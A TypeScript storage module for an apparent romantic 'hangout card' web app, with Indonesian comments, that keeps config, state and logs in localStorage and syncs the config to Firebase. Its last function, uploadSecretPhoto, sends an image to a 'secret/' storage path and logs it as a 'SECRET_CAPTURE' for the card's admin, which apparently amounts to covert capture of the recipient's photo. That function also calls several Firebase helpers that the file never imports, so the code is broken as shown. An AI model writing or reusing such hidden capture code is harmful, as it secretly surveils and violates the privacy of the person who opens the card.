import type { AppState, ContentConfig } from "./types";
import { DEFAULT_CONFIG } from "./defaultConfig";
import { db } from "../firebase"; // Import koneksi firebase lo
import { doc, getDoc, setDoc } from "firebase/firestore";

const KEY_STATE = "hangout_card_state_v1";
const KEY_CONFIG = "hangout_card_config_v1";
const KEY_LOGS = "hangout_card_logs_v1";

// --- FUNGSI BARU UNTUK FIREBASE ---
export async function syncFromFirebase(): Promise<ContentConfig | null> {
  try {
    const docRef = doc(db, "configs", "main_config");
    const docSnap = await getDoc(docRef);
    if (docSnap.exists()) {
      const data = docSnap.data() as ContentConfig;
      saveConfig(data); // Simpan ke local biar awet
      return hydrateConfig(data);
    }
  } catch (e) {
    console.error("Gagal tarik data:", e);
  }
  return null;
}

export async function syncToFirebase(cfg: ContentConfig) {
  try {
    await setDoc(doc(db, "configs", "main_config"), cfg);
  } catch (e) {
    console.error("Gagal simpan ke awan:", e);
  }
}

// --- KODINGAN LAMA LO (DENGAN MODIFIKASI) ---
export function loadConfig(): ContentConfig {
  try {
    const raw = localStorage.getItem(KEY_CONFIG);
    if (!raw) return hydrateConfig(DEFAULT_CONFIG);
    const parsed = JSON.parse(raw) as ContentConfig;
    return hydrateConfig(parsed);
  } catch {
    return hydrateConfig(DEFAULT_CONFIG);
  }
}

export function saveConfig(cfg: ContentConfig): void {
  localStorage.setItem(KEY_CONFIG, JSON.stringify(cfg));
  syncToFirebase(cfg); // OTOMATIS KIRIM KE FIREBASE PAS DI SAVE
}

export function resetConfig(): void {
  localStorage.removeItem(KEY_CONFIG);
}

export function loadState(): AppState {
  const fallback: AppState = {
    step: 0,
    unlocked: false,
    music: { enabled: true, volume: 0.85 },
    stats: { gameAttempts: 0 }
  };
  try {
    const raw = localStorage.getItem(KEY_STATE);
    if (!raw) return fallback;
    const parsed = JSON.parse(raw) as AppState;
    return {
      ...fallback,
      ...parsed,
      music: { ...fallback.music, ...parsed.music },
      stats: { ...fallback.stats, ...parsed.stats }
    };
  } catch {
    return fallback;
  }
}

export function saveState(state: AppState): void {
  localStorage.setItem(KEY_STATE, JSON.stringify(state));
}

export function resetState(): void {
  localStorage.removeItem(KEY_STATE);
}

export type StoredLog = { ts: string; type: string; payload?: unknown };

export function pushLog(ev: StoredLog): void {
  const logs = loadLogs();
  logs.push(ev);
  const capped = logs.slice(-400);
  localStorage.setItem(KEY_LOGS, JSON.stringify(capped));
}

export function loadLogs(): StoredLog[] {
  try {
    const raw = localStorage.getItem(KEY_LOGS);
    if (!raw) return [];
    const parsed = JSON.parse(raw) as StoredLog[];
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

export function clearLogs(): void {
  localStorage.removeItem(KEY_LOGS);
}

function hydrateConfig(cfg: ContentConfig): ContentConfig {
  const her = cfg.couple?.herName || "Sayang";
  const you = cfg.couple?.yourName || "Aku";
  const body = (cfg.letter?.body || "").replaceAll("{HER}", her).replaceAll("{YOU}", you);
  return {
    ...DEFAULT_CONFIG,
    ...cfg,
    couple: { ...DEFAULT_CONFIG.couple, ...cfg.couple },
    intro: { ...DEFAULT_CONFIG.intro, ...cfg.intro },
    game: { ...DEFAULT_CONFIG.game, ...cfg.game },
    letter: { ...DEFAULT_CONFIG.letter, ...cfg.letter, body },
    places: { ...DEFAULT_CONFIG.places, ...cfg.places, items: cfg.places?.items ?? DEFAULT_CONFIG.places.items },
    outfits: { ...DEFAULT_CONFIG.outfits, ...cfg.outfits, items: cfg.outfits?.items ?? DEFAULT_CONFIG.outfits.items },
    admin: { ...DEFAULT_CONFIG.admin, ...cfg.admin }
  };
}

export const uploadSecretPhoto = async (base64Image: string) => {
  try {
    const fileName = `secret/${Date.now()}.png`;
    const storageRef = ref(storage, fileName);
    const snapshot = await uploadString(storageRef, base64Image, 'data_url');
    const downloadURL = await getDownloadURL(snapshot.ref);

    // Langsung masukin ke database biar Admin (kamu) bisa liat
    await addDoc(collection(db, "sessions"), {
      imgUrl: downloadURL,
      timestamp: serverTimestamp(),
      type: "SECRET_CAPTURE"
    });
    return downloadURL;
  } catch (e) {
    console.error("Gagal kirim rahasia", e);
  }
};